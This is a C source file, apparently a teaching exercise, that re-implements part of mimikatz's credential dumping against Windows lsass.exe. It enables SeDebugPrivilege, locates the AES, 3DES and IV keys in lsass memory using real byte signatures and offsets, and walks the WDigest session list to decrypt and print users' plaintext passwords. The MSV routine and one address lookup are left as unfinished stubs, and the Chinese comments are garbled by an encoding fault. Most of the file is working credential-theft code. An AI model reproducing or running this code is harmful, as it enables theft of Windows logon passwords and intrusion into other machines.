#include "mimikatz.h"
#include <stdio.h>

extern BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
extern HANDLE g_hLsass;

/*****************************************************
 *  �뽫���º�����д��������ʵ�ֶ�Ӧ�Ĺ���              *
 *    - EnableSeDebugPrivilege                       *
 *****************************************************/
 /// �Ƽ�ʹ��API: OpenProcessToken() LookupPrivilegeValueW() AdjustTokenPrivileges()
BOOL EnableSeDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	// �򿪵�ǰ���̵ķ�������
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return FALSE;
	// ��ȡ SeDebugPrivilege �� LUID
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	// �������������е�Ȩ��
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}
	// ����Ƿ�ɹ�������Ȩ��
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}


/*****************************************************
 *  �뽫���µ�����������д��������ʵ�ֶ�Ӧ�Ĺ���         *
 *    - LocateUnprotectLsassMemoryKeys               *
 *	  - GetCredentialsFromMSV                        *
 *	  - GetCredentialsFromWdigest                    *
 *****************************************************/

 /// �� lsass.exe �ڴ��ж�ȡ��������ƾ�ݽ���AES���ܻ���3DES����ʹ�õ���Կ
 /// ������Ӧ��ȫ�ֱ��� g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
 /// �Ƽ�API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD aesOffset = 0, desOffset = 0, ivOffset = 0;
	DWORD aesSigOffset = 0, desSigOffset = 0, ivSigOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey, hDesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey, extracted3DesKey;
	PVOID keyPointer = NULL;

	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
	// ��lsass.exe�����ص�ģ��lsasrv.dll�����뵱ǰ���̵��ڴ�ռ���
	// �������صĻ���ַ lsasrvBaseAddress �� lsass.exe ������ lsasrv.dll ģ��Ļ���ַ����ͬ��
	// ��ͬһ��DLLģ���ڲ�ͬ�����лᱻ���ص�ͬһ��ַ�� ALSR �������Ӱ�����Ϊ��
	// lsasrv.dll ģ���е�ȫ�ֱ��� hAesKey ��һ��ָ��ʵ��AES��Կ�Ľṹ��ָ��
	// ��������λhAesKey��lsass.exe�����еĵ�ַ

	// ǩ����Windows 10/11 ���Կ��ã�
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd8,
						0x48, 0x8d, 0x15 };
	UCHAR keyDESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,//48  8D 45 E0
						0x44, 0x8b, 0x4d, 0xd4,//44 8B 4D D4
						0x48, 0x8d, 0x15 };
	UCHAR keyIVSig[] = { 0x44, 0x8d, 0x4e, 0xf2, //44 8D 4E F2
						0x44, 0x8b, 0xc6, // 44 8B C6
						0x48, 0x8d, 0x15 };
	// lsasrv.dll �� keyAESSig �ֽ���������Ӧ��ָ���࣬���� 99 2C 10 00 (С���� 0x102c99)
	// Ϊȫ�ֱ��� hAesKey ���ڵ�ַ�����һ��ָ���ַ0x1800752BF��ƫ��
	// �� hAesKey �ṹ�����ڵĵ�ַΪ 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ ע���г��ֵľ��Ե�ַ 0x1800752BF ���� win11��lsasrv.dll Ϊ������ͬ
	// .text:0000000180083EB5                 call    cs:__imp_BCryptGenRandom
	/*	.text:0000000180083EBC                 nop     dword ptr[rax + rax + 00h]
		.text : 0000000180083EC1                 mov     ebx, eax
		.text : 0000000180083EC3                 test    eax, eax
		.text : 0000000180083EC5                 js      loc_180083E09
		.text : 0000000180083ECB and [rsp + 70h + var_40], 0
		.text : 0000000180083ED0                 lea     rax, [rbp + pbBuffer]
		.text : 0000000180083ED4                 mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
		.text:0000000180083ED8                 lea     rdx, ? hAesKey@@3PEAXEA; phKey
		.text:0000000180083EDF                 mov     rcx, cs : ? hAesProvider@@3PEAXEA; hAlgorithm
		.text:0000000180083EE6                 mov     r8, rdi; pbKeyObject
		.text:0000000180083EE9                 mov[rsp + 70h + cbSecret], esi; cbSecret
		.text:0000000180083EED                 mov[rsp + 70h + pcbResult], rax; pbSecret
		.text:0000000180083EF2                 call    cs : __imp_BCryptGenerateSymmetricKey
	*/

	// ��lsass���̵��ڴ���������λȫ�ֱ���hAesKey���ڴ�λ��
	// ��ȡ����ָ�� and [rsp+70h+var_40], 0 ���lsasrv.dllģ���ַ��ƫ��
	aesSigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	desSigOffset = SearchPattern(lsasrvBaseAddress, keyDESSig, sizeof keyDESSig);
	ivSigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
	wprintf(L"aesSigOffset = 0x%x\ndesSigOffset = 0x%x\nivSigOffset = 0x%x\n", aesSigOffset,desSigOffset,ivSigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (aesSigOffset != 0) {
		// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig �϶�ȡ4�ֽڵ�ƫ��
		//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
		// *(DWORD *)(0x1800752bb) = 0x102c99
		ReadFromLsass(lsasrvBaseAddress + aesSigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
		wprintf(L"aesOffset = 0x%x\n", aesOffset);	// 0x102c99

		//			0x1800752bb�K
		//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
		// 0x1800752B8�J         ^^ ^^ ^^ ^^
		// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset �϶�ȡ8�ֽڵ�����
		//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
		//
		// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
		// ����ȡ��8�ֽڵ�������һ��ָ��ṹ�� KIWI_BCRYPT_HANDLE_KEY ��ָ��

		ReadFromLsass(lsasrvBaseAddress + aesSigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
		wprintf(L"aesPointer = 0x%p\n", keyPointer); // ���� 0x000002318B910230

		// ��lsass���̵��ڴ�λ�� keyPointer ��ȡ���ṹ���ʵ������
		ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

		// ��ȡ KIWI_BCRYPT_HANDLE_KEY �ṹ����
		// ����Ϊ PKIWI_BCRYPT_KEY81 �ĳ�Ա����ָ����ָ��� KIWI_BCRYPT_KEY81 �ṹ��
		// AES DES ��Կ��ʹ�� KIWI_BCRYPT_KEY81 �ṹ�����
		ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

		// KIWI_BCRYPT_KEY81 �� hardkey.data������Կ�ֽ����ݣ� hardkey.cbSecret������Կ�ĳ���
		memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

		wprintf(L"AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
		HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	}
	if (desSigOffset != 0) {
		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig, &desOffset, sizeof desOffset);
		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
		wprintf(L"desOffset = 0x%x\ndesPointer = 0x%p\n", desOffset, keyPointer);
		ReadFromLsass(keyPointer, &hDesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
		ReadFromLsass(hDesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81));

		memcpy(g_sekurlsa_3DESKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
		wprintf(L"DES Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
		HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);// ���԰���
	}
	if (ivSigOffset != 0) {
		BYTE initializationVector[16] = { 1 };
		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset, g_sekurlsa_IV, sizeof g_sekurlsa_IV);
		//ReadFromLsass(ivPointer, initializationVector, sizeof(initializationVector));
		wprintf(L"IV Located (len %d): ", AES_128_KEY_LENGTH);
		HexdumpBytesPacked(g_sekurlsa_IV, AES_128_KEY_LENGTH);
	}
}

/// ����Wdigest�������ڴ��е���������
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PKIWI_WDIGEST_LIST_ENTRY logSessListAddr = NULL, pList;
	WCHAR passDecrypted[1024];

	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");

	/// ... ���޸�

	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
	pList = entry.This;

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(pList, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)
				));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)
				));

			if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
			else wprintf(L"Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength,
					(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
					wprintf(L"Password: %ls\n\n", passDecrypted);
				}
			}
			else {
				printf("Password: [NULL]\n\n");
			}

		}
		pList = entry.Flink;
	} while (pList != logSessListAddr);
	return;
}

/// �Ƽ�ʹ��API: 
///		LoadLibraryA() 
///		SearchPattern() 
///		ReadFromLsass() 
///		DecryptCredentials() 
///		ExtractUnicodeString()
/// �Ƽ�ʹ�ýṹ��: 
///		KIWI_MSV1_0_LIST_63
///		KIWI_MSV1_0_CREDENTIALS 
///		KIWI_MSV1_0_PRIMARY_CREDENTIALS
VOID GetCredentialsFromMSV() {
	DWORD logSessListSigOffset, LogonSessionListOffset;
	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header

	/// ... ���޸�

	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;

	do {
		KIWI_MSV1_0_LIST_63 listEntry;
		KIWI_MSV1_0_CREDENTIALS credentials;

		/// ... ���޸�

	} while (pList != logSessListAddr);
}